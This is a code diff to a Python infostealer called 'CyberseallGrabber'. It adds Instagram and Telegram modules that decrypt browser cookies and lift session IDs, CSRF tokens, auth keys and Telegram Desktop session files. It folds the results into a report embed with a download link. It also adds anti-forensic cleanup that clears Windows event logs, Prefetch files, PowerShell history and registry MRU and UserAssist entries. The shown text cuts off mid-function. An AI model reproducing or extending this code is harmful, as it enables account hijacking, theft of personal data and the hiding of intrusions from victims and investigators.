@@ -92,6 +92,8 @@ class CyberseallGrabber:
         self.af = []
         self.di = []
         self.co = []
+        self.ig = []
+        self.tg = []
         self.d = os.path.join(os.getenv("APPDATA"), "cyberseall")
         self.keywords = ['password','passwords','wallet','wallets','seed','seeds','private','privatekey','backup','backups','recovery']
         self.lock = threading.Lock()
@@ -1014,7 +1016,9 @@ setInterval(function() {{
                 executor.submit(self.fi): "files",
                 executor.submit(self.vpn): "vpn",
                 executor.submit(self.games): "games",
-                executor.submit(self.discord_inject): "discord"
+                executor.submit(self.discord_inject): "discord",
+                executor.submit(self.instagram): "instagram",
+                executor.submit(self.telegram): "telegram"
             }
             
             for future in as_completed(futures):
@@ -3060,6 +3064,594 @@ module.exports = require('./core.asar');
         except:
             pass
 
+    def instagram(self):
+        try:
+            instagram_data = []
+            
+            # Instagram Browser Sessions extrahieren
+            def extract_instagram_browser_sessions():
+                browser_sessions = []
+                
+                browsers = {
+                    'Chrome': {
+                        'base': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+                        'profiles': ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
+                    },
+                    'Edge': {
+                        'base': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
+                        'profiles': ["Default", "Profile 1", "Profile 2"]
+                    },
+                    'Brave': {
+                        'base': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
+                        'profiles': ["Default", "Profile 1", "Profile 2"]
+                    },
+                    'Firefox': {
+                        'base': os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
+                        'profiles': []
+                    }
+                }
+                
+                firefox_base = browsers['Firefox']['base']
+                if os.path.exists(firefox_base):
+                    try:
+                        for item in os.listdir(firefox_base):
+                            if os.path.isdir(os.path.join(firefox_base, item)):
+                                browsers['Firefox']['profiles'].append(item)
+                    except:
+                        pass
+                
+                for browser_name, browser_info in browsers.items():
+                    base_path = browser_info['base']
+                    if not os.path.exists(base_path):
+                        continue
+                    
+                    master_key = None
+                    if browser_name != 'Firefox':
+                        state_file = os.path.join(base_path, "Local State")
+                        if os.path.exists(state_file):
+                            try:
+                                with open(state_file, "r", encoding="utf-8") as f:
+                                    local_state = json.loads(f.read())
+                                    encrypted_key = local_state["os_crypt"]["encrypted_key"]
+                                    master_key = base64.b64decode(encrypted_key)[5:]
+                                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                            except:
+                                pass
+                    
+                    for profile in browser_info['profiles']:
+                        if browser_name == 'Firefox':
+                            profile_path = os.path.join(base_path, profile)
+                        else:
+                            profile_path = os.path.join(base_path, profile)
+                        
+                        if not os.path.exists(profile_path):
+                            continue
+                        
+                        if browser_name == 'Firefox':
+                            cookies_path = os.path.join(profile_path, "cookies.sqlite")
+                        else:
+                            cookies_path = os.path.join(profile_path, "Cookies")
+                        
+                        if os.path.exists(cookies_path):
+                            try:
+                                temp_cookies_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_{profile}_ig_cookies.db")
+                                if os.path.exists(temp_cookies_db):
+                                    os.remove(temp_cookies_db)
+                                
+                                shutil.copy2(cookies_path, temp_cookies_db)
+                                
+                                conn = sqlite3.connect(temp_cookies_db)
+                                cursor = conn.cursor()
+                                
+                                if browser_name == 'Firefox':
+                                    cursor.execute("SELECT host, name, value FROM moz_cookies WHERE host LIKE '%instagram%' OR host LIKE '%cdninstagram%'")
+                                else:
+                                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%instagram%' OR host_key LIKE '%cdninstagram%'")
+                                
+                                cookies = cursor.fetchall()
+                                
+                                session_data = {
+                                    'browser': f"{browser_name}-{profile}",
+                                    'cookies': [],
+                                    'session_id': None,
+                                    'csrf_token': None,
+                                    'user_id': None
+                                }
+                                
+                                for cookie in cookies:
+                                    if browser_name == 'Firefox':
+                                        host, name, value = cookie
+                                        decrypted_value = value
+                                    else:
+                                        host, name, encrypted_value = cookie
+                                        if master_key and encrypted_value:
+                                            try:
+                                                if encrypted_value[:3] in [b'v10', b'v11', b'v20']:
+                                                    iv = encrypted_value[3:15]
+                                                    encrypted_data = encrypted_value[15:]
+                                                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                                                    decrypted_value = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
+                                                else:
+                                                    result = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)
+                                                    decrypted_value = result[1].decode('utf-8') if result[1] else ""
+                                            except:
+                                                decrypted_value = ""
+                                        else:
+                                            decrypted_value = ""
+                                    
+                                    if decrypted_value:
+                                        session_data['cookies'].append({
+                                            'name': name,
+                                            'value': decrypted_value[:100] + "..." if len(decrypted_value) > 100 else decrypted_value,
+                                            'domain': host
+                                        })
+                                        
+                                        if name == 'sessionid':
+                                            session_data['session_id'] = decrypted_value
+                                        elif name == 'csrftoken':
+                                            session_data['csrf_token'] = decrypted_value
+                                        elif name == 'ds_user_id':
+                                            session_data['user_id'] = decrypted_value
+                                
+                                if session_data['cookies']:
+                                    browser_sessions.append(session_data)
+                                
+                                cursor.close()
+                                conn.close()
+                                
+                                try:
+                                    os.remove(temp_cookies_db)
+                                except:
+                                    pass
+                                    
+                            except:
+                                pass
+                        
+                        # Local Storage für Web-App Daten
+                        if browser_name != 'Firefox':
+                            local_storage_path = os.path.join(profile_path, "Local Storage", "leveldb")
+                            if os.path.exists(local_storage_path):
+                                try:
+                                    for file in os.listdir(local_storage_path):
+                                        if file.endswith(('.ldb', '.log')):
+                                            file_path = os.path.join(local_storage_path, file)
+                                            try:
+                                                with open(file_path, 'r', errors='ignore') as f:
+                                                    content = f.read()
+                                                    
+                                                    ig_patterns = [
+                                                        r'"username":"([^"]+)"',
+                                                        r'"full_name":"([^"]+)"',
+                                                        r'"profile_pic_url":"([^"]+)"',
+                                                        r'"follower_count":(\d+)',
+                                                        r'"following_count":(\d+)',
+                                                        r'"media_count":(\d+)'
+                                                    ]
+                                                    
+                                                    for pattern in ig_patterns:
+                                                        matches = re.findall(pattern, content)
+                                                        if matches:
+                                                            for session in browser_sessions:
+                                                                if session['browser'] == f"{browser_name}-{profile}":
+                                                                    if 'profile_data' not in session:
+                                                                        session['profile_data'] = {}
+                                                                    
+                                                                    if 'username' in pattern:
+                                                                        session['profile_data']['username'] = matches[0]
+                                                                    elif 'full_name' in pattern:
+                                                                        session['profile_data']['full_name'] = matches[0]
+                                                                    elif 'follower_count' in pattern:
+                                                                        session['profile_data']['followers'] = matches[0]
+                                                                    elif 'following_count' in pattern:
+                                                                        session['profile_data']['following'] = matches[0]
+                                                                    elif 'media_count' in pattern:
+                                                                        session['profile_data']['posts'] = matches[0]
+                                            except:
+                                                pass
+                                except:
+                                    pass
+                
+                return browser_sessions
+            
+            def extract_instagram_desktop():
+                desktop_data = []
+                
+                instagram_paths = [
+                    os.path.join(os.getenv("LOCALAPPDATA"), "Instagram"),
+                    os.path.join(os.getenv("APPDATA"), "Instagram"),
+                    os.path.join(os.getenv("LOCALAPPDATA"), "Programs", "Instagram"),
+                    os.path.join(os.getenv("USERPROFILE"), "AppData", "Local", "Instagram")
+                ]
+                
+                for ig_path in instagram_paths:
+                    if os.path.exists(ig_path):
+                        try:
+                            for root, dirs, files in os.walk(ig_path):
+                                for file in files:
+                                    if file.lower().endswith(('.json', '.db', '.sqlite', '.config')):
+                                        file_path = os.path.join(root, file)
+                                        try:
+                                            if os.path.getsize(file_path) < 10*1024*1024:  # Max 10MB
+                                                dest_path = os.path.join(self.d, f"instagram_desktop_{file}")
+                                                shutil.copy2(file_path, dest_path)
+                                                desktop_data.append(f"Desktop App: {file}")
+                                        except:
+                                            pass
+                        except:
+                            pass
+                
+                return desktop_data
+            
+            browser_sessions = extract_instagram_browser_sessions()
+            instagram_data.extend(browser_sessions)
+            
+            desktop_data = extract_instagram_desktop()
+            if desktop_data:
+                instagram_data.append({'type': 'desktop_app', 'files': desktop_data})
+            
+            with self.lock:
+                self.ig = instagram_data
+            
+            if instagram_data:
+                try:
+                    with open(os.path.join(self.d, "instagram_data.json"), "w", encoding="utf-8") as f:
+                        json.dump(instagram_data, f, indent=2, ensure_ascii=False)
+                    
+                    with open(os.path.join(self.d, "instagram_summary.txt"), "w", encoding="utf-8") as f:
+                        f.write("INSTAGRAM ACCOUNT STEALER\n")
+                        f.write("=" * 60 + "\n\n")
+                        
+                        session_count = 0
+                        for item in instagram_data:
+                            if isinstance(item, dict) and 'browser' in item:
+                                session_count += 1
+                                f.write(f"SESSION #{session_count} - {item['browser']}\n")
+                                f.write("-" * 40 + "\n")
+                                
+                                if item.get('session_id'):
+                                    f.write(f"Session ID: {item['session_id'][:50]}...\n")
+                                if item.get('csrf_token'):
+                                    f.write(f"CSRF Token: {item['csrf_token'][:30]}...\n")
+                                if item.get('user_id'):
+                                    f.write(f"User ID: {item['user_id']}\n")
+                                
+                                if 'profile_data' in item:
+                                    profile = item['profile_data']
+                                    if 'username' in profile:
+                                        f.write(f"Username: @{profile['username']}\n")
+                                    if 'full_name' in profile:
+                                        f.write(f"Full Name: {profile['full_name']}\n")
+                                    if 'followers' in profile:
+                                        f.write(f"Followers: {profile['followers']}\n")
+                                    if 'following' in profile:
+                                        f.write(f"Following: {profile['following']}\n")
+                                    if 'posts' in profile:
+                                        f.write(f"Posts: {profile['posts']}\n")
+                                
+                                f.write(f"Cookies Found: {len(item.get('cookies', []))}\n")
+                                f.write("\n")
+                        
+                        f.write("=" * 60 + "\n")
+                        f.write(f"TOTAL INSTAGRAM SESSIONS: {session_count}\n")
+                        f.write("=" * 60 + "\n")
+                except:
+                    pass
+        except:
+            pass
+
+    def telegram(self):
+        try:
+            telegram_data = []
+            
+            def extract_telegram_desktop():
+                desktop_sessions = []
+                
+                telegram_paths = [
+                    os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata"),
+                    os.path.join(os.getenv("LOCALAPPDATA"), "Telegram Desktop", "tdata"),
+                    os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", "Telegram Desktop", "tdata"),
+                    os.path.join(os.getenv("APPDATA"), "TelegramDesktop", "tdata")
+                ]
+                
+                for tg_path in telegram_paths:
+                    if os.path.exists(tg_path):
+                        try:
+                            session_files = []
+                            config_files = []
+                            
+                            for item in os.listdir(tg_path):
+                                item_path = os.path.join(tg_path, item)
+                                
+                                if os.path.isfile(item_path):
+                                    if (len(item) == 16 and item.isalnum()) or item in ['key_datas', 'settings', 'shortcuts-custom.json']:
+                                        try:
+                                            if os.path.getsize(item_path) < 50*1024*1024:  # Max 50MB
+                                                dest_path = os.path.join(self.d, f"telegram_{item}")
+                                                shutil.copy2(item_path, dest_path)
+                                                session_files.append(item)
+                                        except:
+                                            pass
+                                    
+                                    elif item.lower().endswith(('.json', '.dat', '.db')):
+                                        try:
+                                            if os.path.getsize(item_path) < 10*1024*1024:  # Max 10MB
+                                                dest_path = os.path.join(self.d, f"telegram_config_{item}")
+                                                shutil.copy2(item_path, dest_path)
+                                                config_files.append(item)
+                                        except:
+                                            pass
+                                
+                                elif os.path.isdir(item_path) and len(item) <= 20:
+                                    try:
+                                        for subitem in os.listdir(item_path):
+                                            subitem_path = os.path.join(item_path, subitem)
+                                            if os.path.isfile(subitem_path):
+                                                if subitem.lower().endswith(('.json', '.dat', '.db', '.key')):
+                                                    try:
+                                                        if os.path.getsize(subitem_path) < 10*1024*1024:
+                                                            dest_path = os.path.join(self.d, f"telegram_{item}_{subitem}")
+                                                            shutil.copy2(subitem_path, dest_path)
+                                                            config_files.append(f"{item}/{subitem}")
+                                                    except:
+                                                        pass
+                                    except:
+                                        pass
+                            
+                            if session_files or config_files:
+                                desktop_sessions.append({
+                                    'path': tg_path,
+                                    'session_files': session_files,
+                                    'config_files': config_files,
+                                    'total_files': len(session_files) + len(config_files)
+                                })
+                        except:
+                            pass
+                
+                return desktop_sessions
+            
+            def extract_telegram_web_sessions():
+                web_sessions = []
+                
+                browsers = {
+                    'Chrome': {
+                        'base': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+                        'profiles': ["Default", "Profile 1", "Profile 2", "Profile 3"]
+                    },
+                    'Edge': {
+                        'base': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
+                        'profiles': ["Default", "Profile 1", "Profile 2"]
+                    },
+                    'Brave': {
+                        'base': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
+                        'profiles': ["Default", "Profile 1"]
+                    }
+                }
+                
+                for browser_name, browser_info in browsers.items():
+                    base_path = browser_info['base']
+                    if not os.path.exists(base_path):
+                        continue
+                    
+                    master_key = None
+                    state_file = os.path.join(base_path, "Local State")
+                    if os.path.exists(state_file):
+                        try:
+                            with open(state_file, "r", encoding="utf-8") as f:
+                                local_state = json.loads(f.read())
+                                encrypted_key = local_state["os_crypt"]["encrypted_key"]
+                                master_key = base64.b64decode(encrypted_key)[5:]
+                                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                        except:
+                            pass
+                    
+                    for profile in browser_info['profiles']:
+                        profile_path = os.path.join(base_path, profile)
+                        if not os.path.exists(profile_path):
+                            continue
+                        
+                        local_storage_path = os.path.join(profile_path, "Local Storage", "leveldb")
+                        if os.path.exists(local_storage_path):
+                            try:
+                                session_data = {
+                                    'browser': f"{browser_name}-{profile}",
+                                    'telegram_sessions': [],
+                                    'auth_keys': [],
+                                    'user_data': {}
+                                }
+                                
+                                for file in os.listdir(local_storage_path):
+                                    if file.endswith(('.ldb', '.log')):
+                                        file_path = os.path.join(local_storage_path, file)
+                                        try:
+                                            with open(file_path, 'r', errors='ignore') as f:
+                                                content = f.read()
+                                                
+                                                tg_patterns = [
+                                                    r'telegram.*auth.*key',
+                                                    r'telegram.*session',
+                                                    r'telegram.*user.*id',
+                                                    r'telegram.*phone',
+                                                    r'telegram.*username',
+                                                    r'webSessionDc\d+',
+                                                    r'authKey.*dc\d+',
+                                                    r'user.*auth.*key'
+                                                ]
+                                                
+                                                for pattern in tg_patterns:
+                                                    matches = re.findall(pattern, content, re.IGNORECASE)
+                                                    if matches:
+                                                        session_data['telegram_sessions'].extend(matches)
+                                                
+                                                if 'web.telegram.org' in content or 'webk.telegram.org' in content:
+                                                    auth_key_pattern = r'"authKey":"([^"]+)"'
+                                                    auth_keys = re.findall(auth_key_pattern, content)
+                                                    session_data['auth_keys'].extend(auth_keys)
+                                                    
+                                                    user_patterns = {
+                                                        'user_id': r'"id":(\d+)',
+                                                        'username': r'"username":"([^"]+)"',
+                                                        'first_name': r'"first_name":"([^"]+)"',
+                                                        'last_name': r'"last_name":"([^"]+)"',
+                                                        'phone': r'"phone":"([^"]+)"'
+                                                    }
+                                                    
+                                                    for key, pattern in user_patterns.items():
+                                                        matches = re.findall(pattern, content)
+                                                        if matches:
+                                                            session_data['user_data'][key] = matches[0]
+                                        except:
+                                            pass
+                                
+                                if session_data['telegram_sessions'] or session_data['auth_keys'] or session_data['user_data']:
+                                    web_sessions.append(session_data)
+                            except:
+                                pass
+                        
+                        cookies_path = os.path.join(profile_path, "Cookies")
+                        if os.path.exists(cookies_path):
+                            try:
+                                temp_cookies_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_{profile}_tg_cookies.db")
+                                if os.path.exists(temp_cookies_db):
+                                    os.remove(temp_cookies_db)
+                                
+                                shutil.copy2(cookies_path, temp_cookies_db)
+                                
+                                conn = sqlite3.connect(temp_cookies_db)
+                                cursor = conn.cursor()
+                                
+                                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%telegram%'")
+                                cookies = cursor.fetchall()
+                                
+                                telegram_cookies = []
+                                for cookie in cookies:
+                                    host, name, encrypted_value = cookie
+                                    if master_key and encrypted_value:
+                                        try:
+                                            if encrypted_value[:3] in [b'v10', b'v11', b'v20']:
+                                                iv = encrypted_value[3:15]
+                                                encrypted_data = encrypted_value[15:]
+                                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                                                decrypted_value = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
+                                            else:
+                                                result = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)
+                                                decrypted_value = result[1].decode('utf-8') if result[1] else ""
+                                            
+                                            if decrypted_value:
+                                                telegram_cookies.append({
+                                                    'name': name,
+                                                    'value': decrypted_value[:100] + "..." if len(decrypted_value) > 100 else decrypted_value,
+                                                    'domain': host
+                                                })
+                                        except:
+                                            pass
+                                
+                                if telegram_cookies:
+                                    existing_session = None
+                                    for session in web_sessions:
+                                        if session['browser'] == f"{browser_name}-{profile}":
+                                            existing_session = session
+                                            break
+                                    
+                                    if existing_session:
+                                        existing_session['cookies'] = telegram_cookies
+                                    else:
+                                        web_sessions.append({
+                                            'browser': f"{browser_name}-{profile}",
+                                            'cookies': telegram_cookies,
+                                            'telegram_sessions': [],
+                                            'auth_keys': [],
+                                            'user_data': {}
+                                        })
+                                
+                                cursor.close()
+                                conn.close()
+                                
+                                try:
+                                    os.remove(temp_cookies_db)
+                                except:
+                                    pass
+                                    
+                            except:
+                                pass
+                
+                return web_sessions
+            
+            desktop_sessions = extract_telegram_desktop()
+            telegram_data.extend(desktop_sessions)
+            
+            web_sessions = extract_telegram_web_sessions()
+            telegram_data.extend(web_sessions)
+            
+            with self.lock:
+                self.tg = telegram_data
+            
+            if telegram_data:
+                try:
+                    with open(os.path.join(self.d, "telegram_data.json"), "w", encoding="utf-8") as f:
+                        json.dump(telegram_data, f, indent=2, ensure_ascii=False)
+                    
+                    with open(os.path.join(self.d, "telegram_summary.txt"), "w", encoding="utf-8") as f:
+                        f.write("TELEGRAM ACCOUNT STEALER\n")
+                        f.write("=" * 60 + "\n\n")
+                        
+                        desktop_count = 0
+                        web_count = 0
+                        
+                        for item in telegram_data:
+                            if isinstance(item, dict):
+                                if 'path' in item:  # Desktop Session
+                                    desktop_count += 1
+                                    f.write(f"DESKTOP SESSION #{desktop_count}\n")
+                                    f.write("-" * 40 + "\n")
+                                    f.write(f"Path: {item['path']}\n")
+                                    f.write(f"Session Files: {len(item.get('session_files', []))}\n")
+                                    f.write(f"Config Files: {len(item.get('config_files', []))}\n")
+                                    f.write(f"Total Files: {item.get('total_files', 0)}\n")
+                                    
+                                    if item.get('session_files'):
+                                        f.write("Session Files:\n")
+                                        for sf in item['session_files'][:10]:
+                                            f.write(f"  - {sf}\n")
+                                    
+                                    if item.get('config_files'):
+                                        f.write("Config Files:\n")
+                                        for cf in item['config_files'][:10]:
+                                            f.write(f"  - {cf}\n")
+                                    f.write("\n")
+                                
+                                elif 'browser' in item:  # Web Session
+                                    web_count += 1
+                                    f.write(f"WEB SESSION #{web_count} - {item['browser']}\n")
+                                    f.write("-" * 40 + "\n")
+                                    
+                                    if item.get('user_data'):
+                                        user = item['user_data']
+                                        if 'username' in user:
+                                            f.write(f"Username: @{user['username']}\n")
+                                        if 'first_name' in user:
+                                            f.write(f"First Name: {user['first_name']}\n")
+                                        if 'last_name' in user:
+                                            f.write(f"Last Name: {user['last_name']}\n")
+                                        if 'phone' in user:
+                                            f.write(f"Phone: {user['phone']}\n")
+                                        if 'user_id' in user:
+                                            f.write(f"User ID: {user['user_id']}\n")
+                                    
+                                    f.write(f"Auth Keys: {len(item.get('auth_keys', []))}\n")
+                                    f.write(f"Session Data: {len(item.get('telegram_sessions', []))}\n")
+                                    f.write(f"Cookies: {len(item.get('cookies', []))}\n")
+                                    f.write("\n")
+                        
+                        f.write("=" * 60 + "\n")
+                        f.write(f"TOTAL DESKTOP SESSIONS: {desktop_count}\n")
+                        f.write(f"TOTAL WEB SESSIONS: {web_count}\n")
+                        f.write(f"TOTAL TELEGRAM SESSIONS: {desktop_count + web_count}\n")
+                        f.write("=" * 60 + "\n")
+                except:
+                    pass
+        except:
+            pass
+
     def si(self):
         try:
             sys_info = {
@@ -3072,7 +3664,9 @@ module.exports = require('./core.asar');
                 "passwords_found": len(self.p),
                 "files_found": len(self.f),
                 "vpns_found": len(self.v),
-                "games_found": len(self.ga)
+                "games_found": len(self.ga),
+                "instagram_sessions": len(self.ig),
+                "telegram_sessions": len(self.tg)
             }
             with open(os.path.join(self.d, "system_info.json"), "w") as f:
                 json.dump(sys_info, f, indent=2)
@@ -3164,7 +3758,9 @@ module.exports = require('./core.asar');
                     f.write(f"Keyword Files: {len(self.f)}\n")
                     f.write(f"VPN Configurations: {len(self.v)}\n")
                     f.write(f"Gaming Accounts: {len(self.ga)}\n")
-                    f.write(f"Discord Injections: {len(self.di)}\n\n")
+                    f.write(f"Discord Injections: {len(self.di)}\n")
+                    f.write(f"Instagram Sessions: {len(self.ig)}\n")
+                    f.write(f"Telegram Sessions: {len(self.tg)}\n\n")
                     f.write("TARGET INFORMATION:\n")
                     f.write(f"User: {getpass.getuser()}\n")
                     f.write(f"Computer: {os.getenv('COMPUTERNAME', 'Unknown')}\n")
@@ -3294,12 +3890,14 @@ module.exports = require('./core.asar');
             total_autofill = len(self.af)
             total_cookies = len(self.co)
             total_injections = len(self.di)
+            total_instagram = len(self.ig)
+            total_telegram = len(self.tg)
             
 
             embed_fields = [
                 {
                     "name": "TTS-Spammer Stealth Stealer",
-                    "value": f"```Browser Passwords: {total_passwords}\nBrowser History: {total_history}\nAutofill Data: {total_autofill}\nBrowser Cookies: {total_cookies}\nRaw Tokens: {total_tokens}\nValid Tokens: {valid_tokens}\nKeyword Files: {total_files}\nVPNs Found: {total_vpns}\nGaming Accounts: {total_games}\nDiscord Injections: {total_injections}```",
+                    "value": f"```Browser Passwords: {total_passwords}\nBrowser History: {total_history}\nAutofill Data: {total_autofill}\nBrowser Cookies: {total_cookies}\nRaw Tokens: {total_tokens}\nValid Tokens: {valid_tokens}\nKeyword Files: {total_files}\nVPNs Found: {total_vpns}\nGaming Accounts: {total_games}\nDiscord Injections: {total_injections}\nInstagram Sessions: {total_instagram}\nTelegram Sessions: {total_telegram}```",
                     "inline": False
                 },
                 {
@@ -3395,6 +3993,51 @@ module.exports = require('./core.asar');
                 })
             
 
+            if total_instagram > 0:
+                instagram_summary = []
+                for item in self.ig[:3]:
+                    if isinstance(item, dict) and 'browser' in item:
+                        browser = item['browser']
+                        session_info = f"{browser}: "
+                        if item.get('session_id'):
+                            session_info += "✅ Session Active"
+                        if 'profile_data' in item and 'username' in item['profile_data']:
+                            session_info += f" (@{item['profile_data']['username']})"
+                        instagram_summary.append(session_info)
+                
+                if instagram_summary:
+                    embed_fields.append({
+                        "name": "📸 Instagram Sessions",
+                        "value": f"```{chr(10).join(instagram_summary)}```",
+                        "inline": False
+                    })
+            
+
+            if total_telegram > 0:
+                telegram_summary = []
+                for item in self.tg[:3]:
+                    if isinstance(item, dict):
+                        if 'path' in item:  # Desktop Session
+                            telegram_summary.append(f"Desktop: {item.get('total_files', 0)} files")
+                        elif 'browser' in item:  # Web Session
+                            browser = item['browser']
+                            session_info = f"{browser}: "
+                            if item.get('user_data') and 'username' in item['user_data']:
+                                session_info += f"@{item['user_data']['username']}"
+                            elif item.get('auth_keys'):
+                                session_info += f"{len(item['auth_keys'])} auth keys"
+                            else:
+                                session_info += "Session data found"
+                            telegram_summary.append(session_info)
+                
+                if telegram_summary:
+                    embed_fields.append({
+                        "name": "💬 Telegram Sessions",
+                        "value": f"```{chr(10).join(telegram_summary)}```",
+                        "inline": False
+                    })
+            
+
             embed_fields.append({
                 "name": "Download All Data",
                 "value": f"[**CLICK HERE TO DOWNLOAD**]({self.link if hasattr(self, 'link') else 'Upload failed'})",
@@ -3420,8 +4063,248 @@ module.exports = require('./core.asar');
     def cleanup(self):
         try:
             time.sleep(1)
+            
             if os.path.exists(self.d):
                 shutil.rmtree(self.d, ignore_errors=True)
+            
+            self.cleanup_temp_files()
+            self.cleanup_browser_traces()
+            self.cleanup_system_traces()
+            
+        except:
+            pass
+
+    def cleanup_temp_files(self):
+        try:
+            temp_dirs = [
+                os.getenv("TEMP"),
+                os.getenv("TMP"),
+                os.path.join(os.getenv("LOCALAPPDATA"), "Temp"),
+                os.path.join(os.getenv("APPDATA"), "Local", "Temp")
+            ]
+            
+            temp_patterns = [
+                "*_login_*.db",
+                "*_history_*.db", 
+                "*_webdata*.db",
+                "*_cookies*.db",
+                "sys_injector_*.py",
+                "sys_monitor_*.ps1",
+                "sys_update_*.py",
+                "*cyberseall*",
+                "*grabber*",
+                "*stealer*"
+            ]
+            
+            for temp_dir in temp_dirs:
+                if temp_dir and os.path.exists(temp_dir):
+                    try:
+                        for pattern in temp_patterns:
+                            import glob
+                            for file_path in glob.glob(os.path.join(temp_dir, pattern)):
+                                try:
+                                    if os.path.isfile(file_path):
+                                        os.remove(file_path)
+                                    elif os.path.isdir(file_path):
+                                        shutil.rmtree(file_path, ignore_errors=True)
+                                except:
+                                    pass
+                    except:
+                        pass
+        except:
+            pass
+
+    def cleanup_browser_traces(self):
+        try:
+            browser_temp_patterns = [
+                "Chrome*_login_*.db",
+                "Edge*_login_*.db", 
+                "Brave*_login_*.db",
+                "Chrome*_history_*.db",
+                "Edge*_history_*.db",
+                "Brave*_history_*.db",
+                "Chrome*_webdata*.db",
+                "Edge*_webdata*.db",
+                "Brave*_webdata*.db",
+                "Chrome*_cookies*.db",
+                "Edge*_cookies*.db",
+                "Brave*_cookies*.db"
+            ]
+            
+            temp_locations = [
+                os.getenv("TEMP"),
+                os.getenv("TMP"),
+                os.path.join(os.getenv("LOCALAPPDATA"), "Temp")
+            ]
+            
+            for temp_dir in temp_locations:
+                if temp_dir and os.path.exists(temp_dir):
+                    try:
+                        for pattern in browser_temp_patterns:
+                            import glob
+                            for file_path in glob.glob(os.path.join(temp_dir, pattern)):
+                                try:
+                                    os.remove(file_path)
+                                except:
+                                    pass
+                    except:
+                        pass
+        except:
+            pass
+
+    def cleanup_system_traces(self):
+        try:
+            prefetch_dir = os.path.join("C:", "Windows", "Prefetch")
+            if os.path.exists(prefetch_dir):
+                try:
+                    for file in os.listdir(prefetch_dir):
+                        if any(keyword in file.lower() for keyword in ['python', 'grabber', 'stealer', 'cyberseall']):
+                            try:
+                                os.remove(os.path.join(prefetch_dir, file))
+                            except:
+                                pass
+                except:
+                    pass
+            
+            recent_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Recent")
+            if os.path.exists(recent_dir):
+                try:
+                    for file in os.listdir(recent_dir):
+                        if any(keyword in file.lower() for keyword in ['grabber', 'stealer', 'cyberseall']):
+                            try:
+                                os.remove(os.path.join(recent_dir, file))
+                            except:
+                                pass
+                except:
+                    pass
+            
+            ps_history_paths = [
+                os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt"),
+                os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
+            ]
+            
+            for ps_history in ps_history_paths:
+                if os.path.exists(ps_history):
+                    try:
+                        with open(ps_history, 'r', encoding='utf-8', errors='ignore') as f:
+                            lines = f.readlines()
+                        
+                        cleaned_lines = []
+                        for line in lines:
+                            if not any(keyword in line.lower() for keyword in ['grabber', 'stealer', 'cyberseall', 'webhook', 'discord.com/api/webhooks']):
+                                cleaned_lines.append(line)
+                        
+                        with open(ps_history, 'w', encoding='utf-8') as f:
+                            f.writelines(cleaned_lines)
+                    except:
+                        pass
+            
+            try:
+                subprocess.run(['wevtutil', 'cl', 'Application'], check=False, shell=False, 
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                subprocess.run(['wevtutil', 'cl', 'System'], check=False, shell=False,
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except:
+                pass
+            
+            self.cleanup_registry_traces()
+            
+        except:
+            pass
+
+    def cleanup_registry_traces(self):
+        try:
+            mru_keys = [
+                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
+                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
+                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
+            ]
+            
+            for key_path in mru_keys:
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
+                    
+                    values_to_delete = []
+                    try:
+                        i = 0
+                        while True:
+                            try:
+                                value_name, value_data, value_type = winreg.EnumValue(key, i)
+                                if isinstance(value_data, str) and any(keyword in value_data.lower() for keyword in ['grabber', 'stealer', 'cyberseall']):
+                                    values_to_delete.append(value_name)
+                                elif isinstance(value_data, bytes):
+                                    try:
+                                        decoded_data = value_data.decode('utf-8', errors='ignore').lower()
+                                        if any(keyword in decoded_data for keyword in ['grabber', 'stealer', 'cyberseall']):
+                                            values_to_delete.append(value_name)
+                                    except:
+                                        pass
+                                i += 1
+                            except OSError:
+                                break
+                    except:
+                        pass
+                    
+                    for value_name in values_to_delete:
+                        try:
+                            winreg.DeleteValue(key, value_name)
+                        except:
+                            pass
+                    
+                    winreg.CloseKey(key)
+                except:
+                    pass
+            
+            try:
+                userassist_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, userassist_key, 0, winreg.KEY_READ)
+                
+                subkey_names = []
+                try:
+                    i = 0
+                    while True:
+                        try:
+                            subkey_name = winreg.EnumKey(key, i)
+                            subkey_names.append(subkey_name)
+                            i += 1
+                        except OSError:
+                            break
+                except:
+                    pass
+                
+                winreg.CloseKey(key)
+                
+                for subkey_name in subkey_names:
+                    try:
+                        count_key_path = f"{userassist_key}\\{subkey_name}\\Count"
